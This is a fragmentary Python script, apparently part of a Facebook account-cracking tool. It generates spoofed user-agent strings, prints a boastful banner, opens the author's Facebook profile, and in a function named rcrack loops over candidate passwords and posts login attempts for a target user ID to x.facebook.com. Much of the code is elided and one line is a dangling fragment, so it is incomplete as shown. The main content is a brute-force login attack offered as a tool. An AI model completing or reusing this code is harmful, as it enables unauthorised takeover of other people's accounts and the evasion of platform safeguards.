...
for sat in range(1000):
    ...
    ugen.append(uaku2)
logo=("""
                        \033[1;39m𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐌𝐘 𝗚𝗫 𝐖𝐎𝐑𝐋𝐃 ʘ⁠‿⁠ʘ★𖤍
...
def fuck():
    user=[]
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/wajedul.ahmad?mibextid=ZbWKwL')
    print(logo)
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'user-agent':pro}
            lo = session.post('https://x.facebook.com/',data=log_data,headers=header_freefb).text
